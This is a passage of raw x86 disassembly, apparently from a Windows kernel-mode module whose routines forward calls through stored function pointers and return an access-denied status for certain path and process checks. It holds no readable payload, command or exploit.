   14e95:	call   0x12610
   14e9a:	mov    DWORD PTR [ebp+0x2c],esi
   14e9d:	cmp    eax,edi
   14e9f:	je     0x14ec6
   14ea1:	lea    eax,[ebp+0x2c]
   14ea4:	push   eax
   14ea5:	push   DWORD PTR [ebp-0x24]
   14ea8:	mov    eax,DWORD PTR [ebp+0x8]
   14eab:	push   DWORD PTR [eax]
   14ead:	call   0x11554
   14eb2:	test   al,al
   14eb4:	je     0x1505b
   14eba:	cmp    DWORD PTR [ebp+0x2c],0x2
   14ebe:	jbe    0x1505b
   14ec4:	xor    edi,edi
   14ec6:	xor    ebx,ebx
   14ec8:	call   DWORD PTR ds:0x1b154
   14ece:	call   DWORD PTR ds:0x1b208
   14ed4:	push   edi
   14ed5:	push   eax
   14ed6:	push   0x3
   14ed8:	call   0x11902
   14edd:	test   eax,eax
   14edf:	je     0x14ee6
   14ee1:	push   0x3
   14ee3:	pop    ebx
   14ee4:	jmp    0x14f31
   14ee6:	push   edi
   14ee7:	push   DWORD PTR [ebp-0x24]
   14eea:	push   0x4
   14eec:	call   0x11902
   14ef1:	test   eax,eax
   14ef3:	je     0x14ef9
   14ef5:	push   0x4
   14ef7:	jmp    0x14ee3
   14ef9:	push   edi
   14efa:	push   DWORD PTR [ebp-0x24]
   14efd:	push   0x5
   14eff:	call   0x11902
   14f04:	test   eax,eax
   14f06:	je     0x14f0c
   14f08:	push   0x5
   14f0a:	jmp    0x14ee3
   14f0c:	push   edi
   14f0d:	push   DWORD PTR [ebp-0x24]
   14f10:	push   0x6
   14f12:	call   0x11902
   14f17:	test   eax,eax
   14f19:	je     0x14f27
   14f1b:	test   DWORD PTR [ebp+0xc],0x50000002
   14f22:	je     0x14f27
   14f24:	push   0x6
   14f26:	pop    ebx
   14f27:	cmp    ebx,edi
   14f29:	je     0x1505b
   14f2f:	xor    edi,edi
   14f31:	mov    BYTE PTR [ebp-0x19],0x1
   14f35:	push   DWORD PTR [ebp-0x20]
   14f38:	call   0x10d12
   14f3d:	test   al,al
   14f3f:	je     0x14f4b
   14f41:	push   DWORD PTR [ebp-0x20]
   14f44:	call   DWORD PTR ds:0x1b204
   14f4a:	pop    ecx
   14f4b:	cmp    BYTE PTR ds:0x1bf91,0x0
   14f52:	je     0x14f81
   14f54:	lea    eax,[ebp+0x2c]
   14f57:	push   eax
   14f58:	push   esi
   14f59:	push   DWORD PTR [ebp-0x28]
   14f5c:	push   0x1b
   14f5e:	push   0xffffffff
   14f60:	call   DWORD PTR ds:0x1b150
   14f66:	cmp    eax,edi
   14f68:	jne    0x14f74
   14f6a:	push   DWORD PTR [ebp-0x28]
   14f6d:	call   DWORD PTR ds:0x1b204
   14f73:	pop    ecx
   14f74:	push   0x5c
   14f76:	push   DWORD PTR [ebp-0x28]
   14f79:	call   DWORD PTR ds:0x1b16c
   14f7f:	pop    ecx
   14f80:	pop    ecx
   14f81:	mov    eax,ebx
   14f83:	sub    eax,0x3
   14f86:	je     0x1505b
   14f8c:	dec    eax
   14f8d:	je     0x15054
   14f93:	dec    eax
   14f94:	je     0x14f9c
   14f96:	dec    eax
   14f97:	jmp    0x15052
   14f9c:	push   0x5c
   14f9e:	push   DWORD PTR [ebp-0x24]
   14fa1:	call   DWORD PTR ds:0x1b16c
   14fa7:	pop    ecx
   14fa8:	pop    ecx
   14fa9:	mov    ebx,eax
   14fab:	cmp    ebx,edi
   14fad:	je     0x14fb9
   14faf:	inc    ebx
   14fb0:	inc    ebx
   14fb1:	push   ebx
   14fb2:	call   DWORD PTR ds:0x1b204
   14fb8:	pop    ecx
   14fb9:	push   0x1a6c4
   14fbe:	push   DWORD PTR [ebp-0x20]
   14fc1:	mov    edi,DWORD PTR ds:0x1b1c8
   14fc7:	call   edi
   14fc9:	pop    ecx
   14fca:	pop    ecx
   14fcb:	mov    esi,DWORD PTR ds:0x1b168
   14fd1:	test   eax,eax
   14fd3:	je     0x15024
   14fd5:	push   0x1a6aa
   14fda:	push   DWORD PTR [ebp-0x20]
   14fdd:	call   esi
   14fdf:	pop    ecx
   14fe0:	pop    ecx
   14fe1:	test   eax,eax
   14fe3:	je     0x15024
   14fe5:	test   ebx,ebx
   14fe7:	mov    eax,ebx
   14fe9:	jne    0x14fee
   14feb:	mov    eax,DWORD PTR [ebp-0x24]
   14fee:	push   DWORD PTR [ebp-0x20]
   14ff1:	push   eax
   14ff2:	call   edi
   14ff4:	pop    ecx
   14ff5:	pop    ecx
   14ff6:	test   eax,eax
   14ff8:	jne    0x15024
   14ffa:	test   ebx,ebx
   14ffc:	jne    0x15001
   14ffe:	mov    ebx,DWORD PTR [ebp-0x24]
   15001:	push   0x1a6aa
   15006:	push   ebx
   15007:	call   edi
   15009:	pop    ecx
   1500a:	pop    ecx
   1500b:	test   eax,eax
   1500d:	je     0x1501d
   1500f:	push   0x1ac30
   15014:	push   DWORD PTR [ebp-0x20]
   15017:	call   esi
   15019:	pop    ecx
   1501a:	pop    ecx
   1501b:	jmp    0x15020
   1501d:	xor    eax,eax
   1501f:	inc    eax
   15020:	test   eax,eax
   15022:	jne    0x15054
   15024:	push   0x1ac00
   15029:	push   DWORD PTR [ebp-0x20]
   1502c:	call   esi
   1502e:	pop    ecx
   1502f:	pop    ecx
   15030:	test   eax,eax
   15032:	je     0x15054
   15034:	push   0x1abea
   15039:	push   DWORD PTR [ebp-0x20]
   1503c:	call   esi
   1503e:	pop    ecx
   1503f:	pop    ecx
   15040:	test   eax,eax
   15042:	je     0x15054
   15044:	push   0x1abd2
   15049:	push   DWORD PTR [ebp-0x20]
   1504c:	call   esi
   1504e:	pop    ecx
   1504f:	pop    ecx
   15050:	test   eax,eax
   15052:	jne    0x1505b
   15054:	mov    DWORD PTR [ebp+0x30],0xc0000022
   1505b:	xor    edi,edi
   1505d:	cmp    DWORD PTR [ebp-0x24],edi
   15060:	je     0x1506c
   15062:	push   edi
   15063:	push   DWORD PTR [ebp-0x24]
   15066:	call   DWORD PTR ds:0x1b278
   1506c:	cmp    DWORD PTR [ebp-0x20],edi
   1506f:	je     0x1507b
   15071:	push   edi
   15072:	push   DWORD PTR [ebp-0x20]
   15075:	call   DWORD PTR ds:0x1b278
   1507b:	cmp    DWORD PTR [ebp-0x28],edi
   1507e:	je     0x1508a
   15080:	push   edi
   15081:	push   DWORD PTR [ebp-0x28]
   15084:	call   DWORD PTR ds:0x1b278
   1508a:	cmp    BYTE PTR [ebp-0x19],0x0
   1508e:	je     0x150c0
   15090:	cmp    DWORD PTR [ebp+0x30],0xc0000022
   15097:	jne    0x150c0
   15099:	mov    esi,DWORD PTR [ebp+0x8]
   1509c:	mov    eax,DWORD PTR [esi]
   1509e:	cmp    eax,0xffffffff
   150a1:	je     0x150c0
   150a3:	mov    DWORD PTR [ebp-0x4],edi
   150a6:	push   eax
   150a7:	call   DWORD PTR ds:0x1b180
   150ad:	or     DWORD PTR [esi],0xffffffff
   150b0:	jmp    0x150b9
   150b2:	xor    eax,eax
   150b4:	inc    eax
   150b5:	ret    
   150b6:	mov    esp,DWORD PTR [ebp-0x18]
   150b9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   150c0:	mov    eax,DWORD PTR [ebp+0x30]
   150c3:	call   0x1a20d
   150c8:	ret    0x2c
   150cb:	int3   
   150cc:	int3   
   150cd:	int3   
   150ce:	int3   
   150cf:	int3   
   150d0:	push   0x18
   150d2:	push   0x1b558
   150d7:	call   0x1a1c8
   150dc:	mov    BYTE PTR [ebp-0x19],0x0
   150e0:	xor    esi,esi
   150e2:	mov    DWORD PTR [ebp-0x24],esi
   150e5:	mov    DWORD PTR [ebp-0x20],esi
   150e8:	mov    DWORD PTR [ebp-0x28],esi
   150eb:	push   DWORD PTR [ebp+0x1c]
   150ee:	push   DWORD PTR [ebp+0x18]
   150f1:	push   DWORD PTR [ebp+0x14]
   150f4:	mov    ebx,DWORD PTR [ebp+0x10]
   150f7:	push   ebx
   150f8:	push   DWORD PTR [ebp+0xc]
   150fb:	push   DWORD PTR [ebp+0x8]
   150fe:	call   DWORD PTR ds:0x1c068
   15104:	mov    DWORD PTR [ebp+0x1c],eax
   15107:	cmp    eax,esi
   15109:	jne    0x15386
   1510f:	mov    esi,0x208
   15114:	push   esi
   15115:	push   0x1
   15117:	mov    edi,DWORD PTR ds:0x1b124
   1511d:	call   edi
   1511f:	mov    DWORD PTR [ebp-0x24],eax
   15122:	push   esi
   15123:	push   0x1
   15125:	call   edi
   15127:	mov    DWORD PTR [ebp-0x20],eax
   1512a:	push   esi
   1512b:	push   0x1
   1512d:	call   edi
   1512f:	mov    DWORD PTR [ebp-0x28],eax
   15132:	xor    edi,edi
   15134:	cmp    DWORD PTR [ebp-0x24],edi
   15137:	je     0x15386
   1513d:	cmp    DWORD PTR [ebp-0x20],edi
   15140:	je     0x15386
   15146:	cmp    eax,edi
   15148:	je     0x15386
   1514e:	push   esi
   1514f:	push   edi
   15150:	push   DWORD PTR [ebp-0x24]
   15153:	call   0x1a1b0
   15158:	push   esi
   15159:	push   edi
   1515a:	push   DWORD PTR [ebp-0x20]
   1515d:	call   0x1a1b0
   15162:	push   esi
   15163:	push   edi
   15164:	push   DWORD PTR [ebp-0x28]
   15167:	call   0x1a1b0
   1516c:	add    esp,0x24
   1516f:	mov    eax,0xc0000001
   15174:	cmp    ebx,edi
   15176:	je     0x151c5
   15178:	mov    ecx,DWORD PTR [ebx+0x8]
   1517b:	cmp    ecx,edi
   1517d:	je     0x151c5
   1517f:	cmp    WORD PTR [ecx],di
   15182:	je     0x151c5
   15184:	mov    ecx,DWORD PTR [ecx+0x4]
   15187:	cmp    ecx,edi
   15189:	je     0x151c5
   1518b:	cmp    WORD PTR [ecx],0x5c
   1518f:	jne    0x151c5
   15191:	cmp    WORD PTR [ecx+0x2],0x3f
   15196:	jne    0x151c5
   15198:	cmp    WORD PTR [ecx+0x4],0x3f
   1519d:	jne    0x151c5
   1519f:	cmp    WORD PTR [ecx+0x6],0x5c
   151a4:	jne    0x151c5
   151a6:	cmp    WORD PTR [ecx+0xa],0x3a
   151ab:	jne    0x151c5
   151ad:	mov    eax,DWORD PTR [ebx+0x8]
   151b0:	push   edi
   151b1:	movzx  ecx,WORD PTR [eax]
   151b4:	push   ecx
   151b5:	push   DWORD PTR [eax+0x4]
   151b8:	push   0x104
   151bd:	push   DWORD PTR [ebp-0x24]
   151c0:	call   0x12610
   151c5:	mov    DWORD PTR [ebp+0x18],esi
   151c8:	cmp    eax,edi
   151ca:	je     0x151f1
   151cc:	lea    eax,[ebp+0x18]
   151cf:	push   eax
   151d0:	push   DWORD PTR [ebp-0x24]
   151d3:	mov    eax,DWORD PTR [ebp+0x8]
   151d6:	push   DWORD PTR [eax]
   151d8:	call   0x11554
   151dd:	test   al,al
   151df:	je     0x15386
   151e5:	cmp    DWORD PTR [ebp+0x18],0x2
   151e9:	jbe    0x15386
   151ef:	xor    edi,edi
   151f1:	xor    ebx,ebx
   151f3:	call   DWORD PTR ds:0x1b154
   151f9:	call   DWORD PTR ds:0x1b208
   151ff:	push   edi
   15200:	push   eax
   15201:	push   0x3
   15203:	call   0x11902
   15208:	test   eax,eax
   1520a:	je     0x15211
   1520c:	push   0x3
   1520e:	pop    ebx
   1520f:	jmp    0x1525c
   15211:	push   edi
   15212:	push   DWORD PTR [ebp-0x24]
   15215:	push   0x4
   15217:	call   0x11902
   1521c:	test   eax,eax
   1521e:	je     0x15224
   15220:	push   0x4
   15222:	jmp    0x1520e
   15224:	push   edi
   15225:	push   DWORD PTR [ebp-0x24]
   15228:	push   0x5
   1522a:	call   0x11902
   1522f:	test   eax,eax
   15231:	je     0x15237
   15233:	push   0x5
   15235:	jmp    0x1520e
   15237:	push   edi
   15238:	push   DWORD PTR [ebp-0x24]
   1523b:	push   0x6
   1523d:	call   0x11902
   15242:	test   eax,eax
   15244:	je     0x15252
   15246:	test   DWORD PTR [ebp+0xc],0x50000002
   1524d:	je     0x15252
   1524f:	push   0x6
   15251:	pop    ebx
   15252:	cmp    ebx,edi
   15254:	je     0x15386
   1525a:	xor    edi,edi
   1525c:	mov    BYTE PTR [ebp-0x19],0x1
   15260:	push   DWORD PTR [ebp-0x20]
   15263:	call   0x10d12
   15268:	test   al,al
   1526a:	je     0x15276
   1526c:	push   DWORD PTR [ebp-0x20]
   1526f:	call   DWORD PTR ds:0x1b204
   15275:	pop    ecx
   15276:	cmp    BYTE PTR ds:0x1bf91,0x0
   1527d:	je     0x152ac
   1527f:	lea    eax,[ebp+0x18]
   15282:	push   eax
   15283:	push   esi
   15284:	push   DWORD PTR [ebp-0x28]
   15287:	push   0x1b
   15289:	push   0xffffffff
   1528b:	call   DWORD PTR ds:0x1b150
   15291:	cmp    eax,edi
   15293:	jne    0x1529f
   15295:	push   DWORD PTR [ebp-0x28]
   15298:	call   DWORD PTR ds:0x1b204
   1529e:	pop    ecx
   1529f:	push   0x5c
   152a1:	push   DWORD PTR [ebp-0x28]
   152a4:	call   DWORD PTR ds:0x1b16c
   152aa:	pop    ecx
   152ab:	pop    ecx
   152ac:	mov    eax,ebx
   152ae:	sub    eax,0x3
   152b1:	je     0x15386
   152b7:	dec    eax
   152b8:	je     0x1537f
   152be:	dec    eax
   152bf:	je     0x152c7
   152c1:	dec    eax
   152c2:	jmp    0x1537d
   152c7:	push   0x5c
   152c9:	push   DWORD PTR [ebp-0x24]
   152cc:	call   DWORD PTR ds:0x1b16c
   152d2:	pop    ecx
   152d3:	pop    ecx
   152d4:	mov    ebx,eax
   152d6:	cmp    ebx,edi
   152d8:	je     0x152e4
   152da:	inc    ebx
   152db:	inc    ebx
   152dc:	push   ebx
   152dd:	call   DWORD PTR ds:0x1b204
   152e3:	pop    ecx
   152e4:	push   0x1a6c4
   152e9:	push   DWORD PTR [ebp-0x20]
   152ec:	mov    edi,DWORD PTR ds:0x1b1c8
   152f2:	call   edi
   152f4:	pop    ecx
   152f5:	pop    ecx
   152f6:	mov    esi,DWORD PTR ds:0x1b168
   152fc:	test   eax,eax
   152fe:	je     0x1534f
   15300:	push   0x1a6aa
   15305:	push   DWORD PTR [ebp-0x20]
   15308:	call   esi
   1530a:	pop    ecx
   1530b:	pop    ecx
   1530c:	test   eax,eax
   1530e:	je     0x1534f
   15310:	test   ebx,ebx
   15312:	mov    eax,ebx
   15314:	jne    0x15319
   15316:	mov    eax,DWORD PTR [ebp-0x24]
   15319:	push   DWORD PTR [ebp-0x20]
   1531c:	push   eax
   1531d:	call   edi
   1531f:	pop    ecx
   15320:	pop    ecx
   15321:	test   eax,eax
   15323:	jne    0x1534f
   15325:	test   ebx,ebx
   15327:	jne    0x1532c
   15329:	mov    ebx,DWORD PTR [ebp-0x24]
   1532c:	push   0x1a6aa
   15331:	push   ebx
   15332:	call   edi
   15334:	pop    ecx
   15335:	pop    ecx
   15336:	test   eax,eax
   15338:	je     0x15348
   1533a:	push   0x1ac30
   1533f:	push   DWORD PTR [ebp-0x20]
   15342:	call   esi
   15344:	pop    ecx
   15345:	pop    ecx
   15346:	jmp    0x1534b
   15348:	xor    eax,eax
   1534a:	inc    eax
   1534b:	test   eax,eax
   1534d:	jne    0x1537f
   1534f:	push   0x1ac00
   15354:	push   DWORD PTR [ebp-0x20]
   15357:	call   esi
   15359:	pop    ecx
   1535a:	pop    ecx
   1535b:	test   eax,eax
   1535d:	je     0x1537f
   1535f:	push   0x1abea
   15364:	push   DWORD PTR [ebp-0x20]
   15367:	call   esi
   15369:	pop    ecx
   1536a:	pop    ecx
   1536b:	test   eax,eax
   1536d:	je     0x1537f
   1536f:	push   0x1abd2
   15374:	push   DWORD PTR [ebp-0x20]
   15377:	call   esi
   15379:	pop    ecx
   1537a:	pop    ecx
   1537b:	test   eax,eax
   1537d:	jne    0x15386
   1537f:	mov    DWORD PTR [ebp+0x1c],0xc0000022
   15386:	xor    edi,edi
   15388:	cmp    DWORD PTR [ebp-0x24],edi
   1538b:	je     0x15397
   1538d:	push   edi
   1538e:	push   DWORD PTR [ebp-0x24]
   15391:	call   DWORD PTR ds:0x1b278
   15397:	cmp    DWORD PTR [ebp-0x20],edi
   1539a:	je     0x153a6
   1539c:	push   edi
   1539d:	push   DWORD PTR [ebp-0x20]
   153a0:	call   DWORD PTR ds:0x1b278
   153a6:	cmp    DWORD PTR [ebp-0x28],edi
   153a9:	je     0x153b5
   153ab:	push   edi
   153ac:	push   DWORD PTR [ebp-0x28]
   153af:	call   DWORD PTR ds:0x1b278
   153b5:	cmp    BYTE PTR [ebp-0x19],0x0
   153b9:	je     0x153eb
   153bb:	cmp    DWORD PTR [ebp+0x1c],0xc0000022
   153c2:	jne    0x153eb
   153c4:	mov    esi,DWORD PTR [ebp+0x8]
   153c7:	mov    eax,DWORD PTR [esi]
   153c9:	cmp    eax,0xffffffff
   153cc:	je     0x153eb
   153ce:	mov    DWORD PTR [ebp-0x4],edi
   153d1:	push   eax
   153d2:	call   DWORD PTR ds:0x1b180
   153d8:	or     DWORD PTR [esi],0xffffffff
   153db:	jmp    0x153e4
   153dd:	xor    eax,eax
   153df:	inc    eax
   153e0:	ret    
   153e1:	mov    esp,DWORD PTR [ebp-0x18]
   153e4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   153eb:	mov    eax,DWORD PTR [ebp+0x1c]
   153ee:	call   0x1a20d
   153f3:	ret    0x18
   153f6:	int3   
   153f7:	int3   
   153f8:	int3   
   153f9:	int3   
   153fa:	int3   
   153fb:	int3   
   153fc:	mov    edi,edi
   153fe:	push   ebp
   153ff:	mov    ebp,esp
   15401:	sub    esp,0x1c
   15404:	push   ebx
   15405:	push   esi
   15406:	push   edi
   15407:	mov    edi,DWORD PTR ds:0x1b124
   1540d:	mov    esi,0x208
   15412:	push   esi
   15413:	xor    ebx,ebx
   15415:	push   0x1
   15417:	mov    BYTE PTR [ebp-0x1],bl
   1541a:	mov    DWORD PTR [ebp-0x14],0xc000000d
   15421:	call   edi
   15423:	push   esi
   15424:	push   0x1
   15426:	mov    DWORD PTR [ebp-0xc],eax
   15429:	call   edi
   1542b:	push   esi
   1542c:	push   0x1
   1542e:	mov    DWORD PTR [ebp-0x10],eax
   15431:	call   edi
   15433:	cmp    DWORD PTR [ebp-0xc],ebx
   15436:	mov    DWORD PTR [ebp-0x8],eax
   15439:	je     0x15542
   1543f:	cmp    DWORD PTR [ebp-0x10],ebx
   15442:	je     0x15538
   15448:	cmp    eax,ebx
   1544a:	je     0x15538
   15450:	push   esi
   15451:	push   ebx
   15452:	push   DWORD PTR [ebp-0xc]
   15455:	call   0x1a1b0
   1545a:	push   esi
   1545b:	push   ebx
   1545c:	push   DWORD PTR [ebp-0x10]
   1545f:	call   0x1a1b0
   15464:	push   esi
   15465:	push   ebx
   15466:	push   DWORD PTR [ebp-0x8]
   15469:	call   0x1a1b0
   1546e:	add    esp,0x24
   15471:	lea    eax,[ebp-0x18]
   15474:	push   eax
   15475:	push   DWORD PTR [ebp-0xc]
   15478:	mov    DWORD PTR [ebp-0x18],esi
   1547b:	push   DWORD PTR [ebp+0x8]
   1547e:	call   0x11554
   15483:	test   al,al
   15485:	je     0x15538
   1548b:	cmp    DWORD PTR [ebp-0x18],0x2
   1548f:	jbe    0x15538
   15495:	call   DWORD PTR ds:0x1b154
   1549b:	call   DWORD PTR ds:0x1b208
   154a1:	push   ebx
   154a2:	push   eax
   154a3:	push   0x3
   154a5:	pop    edi
   154a6:	push   edi
   154a7:	call   0x11902
   154ac:	test   eax,eax
   154ae:	jne    0x154d2
   154b0:	push   ebx
   154b1:	push   DWORD PTR [ebp-0xc]
   154b4:	push   0x4
   154b6:	pop    edi
   154b7:	push   edi
   154b8:	call   0x11902
   154bd:	test   eax,eax
   154bf:	jne    0x154d2
   154c1:	push   ebx
   154c2:	push   DWORD PTR [ebp-0xc]
   154c5:	push   0x6
   154c7:	pop    edi
   154c8:	push   edi
   154c9:	call   0x11902
   154ce:	test   eax,eax
   154d0:	je     0x15538
   154d2:	push   DWORD PTR [ebp-0x10]
   154d5:	mov    DWORD PTR [ebp-0x1c],edi
   154d8:	mov    BYTE PTR [ebp-0x1],0x1
   154dc:	call   0x10d12
   154e1:	test   al,al
   154e3:	mov    edi,DWORD PTR ds:0x1b204
   154e9:	je     0x154f1
   154eb:	push   DWORD PTR [ebp-0x10]
   154ee:	call   edi
   154f0:	pop    ecx
   154f1:	cmp    BYTE PTR ds:0x1bf91,bl
   154f7:	je     0x15522
   154f9:	lea    eax,[ebp-0x18]
   154fc:	push   eax
   154fd:	push   esi
   154fe:	push   DWORD PTR [ebp-0x8]
   15501:	push   0x1b
   15503:	push   0xffffffff
   15505:	call   DWORD PTR ds:0x1b150
   1550b:	test   eax,eax
   1550d:	jne    0x15515
   1550f:	push   DWORD PTR [ebp-0x8]
   15512:	call   edi
   15514:	pop    ecx
   15515:	push   0x5c
   15517:	push   DWORD PTR [ebp-0x8]
   1551a:	call   DWORD PTR ds:0x1b16c
   15520:	pop    ecx
   15521:	pop    ecx
   15522:	mov    eax,DWORD PTR [ebp-0x1c]
   15525:	sub    eax,0x3
   15528:	je     0x15538
   1552a:	dec    eax
   1552b:	je     0x15531
   1552d:	dec    eax
   1552e:	dec    eax
   1552f:	jne    0x15538
   15531:	mov    DWORD PTR [ebp-0x14],0xc0000022
   15538:	push   ebx
   15539:	push   DWORD PTR [ebp-0xc]
   1553c:	call   DWORD PTR ds:0x1b278
   15542:	cmp    DWORD PTR [ebp-0x10],ebx
   15545:	je     0x15551
   15547:	push   ebx
   15548:	push   DWORD PTR [ebp-0x10]
   1554b:	call   DWORD PTR ds:0x1b278
   15551:	cmp    DWORD PTR [ebp-0x8],ebx
   15554:	je     0x15560
   15556:	push   ebx
   15557:	push   DWORD PTR [ebp-0x8]
   1555a:	call   DWORD PTR ds:0x1b278
   15560:	cmp    BYTE PTR [ebp-0x1],bl
   15563:	je     0x15579
   15565:	mov    ecx,0xc0000022
   1556a:	cmp    DWORD PTR [ebp-0x14],ecx
   1556d:	jne    0x15579
   1556f:	mov    eax,DWORD PTR [ebp+0x18]
   15572:	mov    DWORD PTR [eax+0x4],ebx
   15575:	mov    DWORD PTR [eax],ecx
   15577:	jmp    0x1559d
   15579:	push   DWORD PTR [ebp+0x28]
   1557c:	push   DWORD PTR [ebp+0x24]
   1557f:	push   DWORD PTR [ebp+0x20]
   15582:	push   DWORD PTR [ebp+0x1c]
   15585:	push   DWORD PTR [ebp+0x18]
   15588:	push   DWORD PTR [ebp+0x14]
   1558b:	push   DWORD PTR [ebp+0x10]
   1558e:	push   DWORD PTR [ebp+0xc]
   15591:	push   DWORD PTR [ebp+0x8]
   15594:	call   DWORD PTR ds:0x1c06c
   1559a:	mov    DWORD PTR [ebp-0x14],eax
   1559d:	mov    eax,DWORD PTR [ebp-0x14]
   155a0:	pop    edi
   155a1:	pop    esi
   155a2:	pop    ebx
   155a3:	leave  
   155a4:	ret    0x24
   155a7:	int3   
   155a8:	int3   
   155a9:	int3   
   155aa:	int3   
   155ab:	int3   
   155ac:	push   0x1c
   155ae:	push   0x1b578
   155b3:	call   0x1a1c8
   155b8:	xor    edi,edi
   155ba:	mov    DWORD PTR [ebp-0x20],edi
   155bd:	mov    DWORD PTR [ebp-0x1c],edi
   155c0:	mov    DWORD PTR [ebp-0x24],edi
   155c3:	mov    DWORD PTR [ebp-0x28],edi
   155c6:	push   DWORD PTR [ebp+0x30]
   155c9:	push   DWORD PTR [ebp+0x2c]
   155cc:	push   DWORD PTR [ebp+0x28]
   155cf:	push   DWORD PTR [ebp+0x24]
   155d2:	push   DWORD PTR [ebp+0x20]
   155d5:	push   DWORD PTR [ebp+0x1c]
   155d8:	push   DWORD PTR [ebp+0x18]
   155db:	push   DWORD PTR [ebp+0x14]
   155de:	push   DWORD PTR [ebp+0x10]
   155e1:	push   DWORD PTR [ebp+0xc]
   155e4:	push   DWORD PTR [ebp+0x8]
   155e7:	call   DWORD PTR ds:0x1c07c
   155ed:	mov    DWORD PTR [ebp-0x2c],eax
   155f0:	cmp    eax,edi
   155f2:	jne    0x1583d
   155f8:	cmp    DWORD PTR [ebp+0x24],0x3
   155fc:	jne    0x1583d
   15602:	mov    ebx,0x208
   15607:	push   ebx
   15608:	push   0x1
   1560a:	mov    esi,DWORD PTR ds:0x1b124
   15610:	call   esi
   15612:	mov    DWORD PTR [ebp-0x20],eax
   15615:	push   ebx
   15616:	push   0x1
   15618:	call   esi
   1561a:	mov    DWORD PTR [ebp-0x1c],eax
   1561d:	cmp    DWORD PTR [ebp-0x20],edi
   15620:	je     0x1584c
   15626:	cmp    eax,edi
   15628:	je     0x1583d
   1562e:	push   ebx
   1562f:	push   edi
   15630:	push   DWORD PTR [ebp-0x20]
   15633:	call   0x1a1b0
   15638:	push   ebx
   15639:	push   edi
   1563a:	push   DWORD PTR [ebp-0x1c]
   1563d:	call   0x1a1b0
   15642:	add    esp,0x18
   15645:	mov    DWORD PTR [ebp+0x24],ebx
   15648:	lea    eax,[ebp+0x24]
   1564b:	push   eax
   1564c:	push   DWORD PTR [ebp-0x20]
   1564f:	push   DWORD PTR [ebp+0x8]
   15652:	call   0x11554
   15657:	test   al,al
   15659:	je     0x1583d
   1565f:	cmp    DWORD PTR [ebp+0x24],0x2
   15663:	jbe    0x1583d
   15669:	mov    eax,DWORD PTR [ebp+0x1c]
   1566c:	mov    DWORD PTR [ebp-0x24],eax
   1566f:	call   DWORD PTR ds:0x1b154
   15675:	call   DWORD PTR ds:0x1b208
   1567b:	push   edi
   1567c:	push   eax
   1567d:	push   0x3
   1567f:	call   0x11902
   15684:	test   eax,eax
   15686:	jne    0x1583d
   1568c:	push   0xfffffffe
   1568e:	pop    edi
   1568f:	cmp    DWORD PTR [ebp-0x24],0x0
   15693:	je     0x1583b
   15699:	push   ebx
   1569a:	push   0x0
   1569c:	push   DWORD PTR [ebp-0x1c]
   1569f:	call   0x1a1b0
   156a4:	add    esp,0xc
   156a7:	and    DWORD PTR [ebp-0x4],0x0
   156ab:	mov    eax,DWORD PTR [ebp-0x20]
   156ae:	lea    edx,[eax+0x2]
   156b1:	mov    cx,WORD PTR [eax]
   156b4:	inc    eax
   156b5:	inc    eax
   156b6:	test   cx,cx
   156b9:	jne    0x156b1
   156bb:	sub    eax,edx
   156bd:	sar    eax,1
   156bf:	mov    esi,0x103
   156c4:	cmp    eax,esi
   156c6:	jae    0x156de
   156c8:	mov    eax,DWORD PTR [ebp-0x20]
   156cb:	lea    edx,[eax+0x2]
   156ce:	mov    cx,WORD PTR [eax]
   156d1:	inc    eax
   156d2:	inc    eax
   156d3:	test   cx,cx
   156d6:	jne    0x156ce
   156d8:	sub    eax,edx
   156da:	sar    eax,1
   156dc:	jmp    0x156e0
   156de:	mov    eax,esi
   156e0:	push   eax
   156e1:	push   DWORD PTR [ebp-0x20]
   156e4:	push   DWORD PTR [ebp-0x1c]
   156e7:	call   DWORD PTR ds:0x1b194
   156ed:	add    esp,0xc
   156f0:	mov    eax,DWORD PTR [ebp-0x20]
   156f3:	lea    ecx,[eax+0x2]
   156f6:	mov    dx,WORD PTR [eax]
   156f9:	inc    eax
   156fa:	inc    eax
   156fb:	test   dx,dx
   156fe:	jne    0x156f6
   15700:	sub    eax,ecx
   15702:	sar    eax,1
   15704:	mov    ecx,DWORD PTR [ebp-0x20]
   15707:	cmp    WORD PTR [ecx+eax*2-0x2],0x5c
   1570d:	je     0x15796
   15713:	mov    eax,0x1abce
   15718:	lea    edx,[eax+0x2]
   1571b:	mov    cx,WORD PTR [eax]
   1571e:	inc    eax
   1571f:	inc    eax
   15720:	test   cx,cx
   15723:	jne    0x1571b
   15725:	sub    eax,edx
   15727:	sar    eax,1
   15729:	mov    esi,eax
   1572b:	mov    eax,DWORD PTR [ebp-0x1c]
   1572e:	lea    ecx,[eax+0x2]
   15731:	mov    dx,WORD PTR [eax]
   15734:	inc    eax
   15735:	inc    eax
   15736:	test   dx,dx
   15739:	jne    0x15731
   1573b:	sub    eax,ecx
   1573d:	sar    eax,1
   1573f:	mov    ecx,0x103
   15744:	sub    ecx,eax
   15746:	cmp    esi,ecx
   15748:	jae    0x15762
   1574a:	mov    eax,0x1abce
   1574f:	lea    edx,[eax+0x2]
   15752:	mov    cx,WORD PTR [eax]
   15755:	inc    eax
   15756:	inc    eax
   15757:	test   cx,cx
   1575a:	jne    0x15752
   1575c:	sub    eax,edx
   1575e:	sar    eax,1
   15760:	jmp    0x1577f
   15762:	mov    eax,DWORD PTR [ebp-0x1c]
   15765:	lea    edx,[eax+0x2]
   15768:	mov    cx,WORD PTR [eax]
   1576b:	inc    eax
   1576c:	inc    eax
   1576d:	test   cx,cx
   15770:	jne    0x15768
   15772:	sub    eax,edx
   15774:	sar    eax,1
   15776:	mov    ecx,eax
   15778:	mov    eax,0x103
   1577d:	sub    eax,ecx
   1577f:	push   eax
   15780:	push   0x1abce
   15785:	push   DWORD PTR [ebp-0x1c]
   15788:	call   DWORD PTR ds:0x1b190
   1578e:	add    esp,0xc
   15791:	mov    esi,0x103
   15796:	mov    eax,DWORD PTR [ebp-0x1c]
   15799:	lea    edx,[eax+0x2]
   1579c:	mov    cx,WORD PTR [eax]
   1579f:	inc    eax
   157a0:	inc    eax
   157a1:	test   cx,cx
   157a4:	jne    0x1579c
   157a6:	sub    eax,edx
   157a8:	sar    eax,1
   157aa:	mov    ecx,DWORD PTR [ebp-0x24]
   157ad:	mov    ecx,DWORD PTR [ecx+0x3c]
   157b0:	shr    ecx,1
   157b2:	mov    edx,esi
   157b4:	sub    edx,eax
   157b6:	cmp    ecx,edx
   157b8:	jb     0x157d2
   157ba:	mov    eax,DWORD PTR [ebp-0x1c]
   157bd:	lea    edx,[eax+0x2]
   157c0:	mov    cx,WORD PTR [eax]
   157c3:	inc    eax
   157c4:	inc    eax
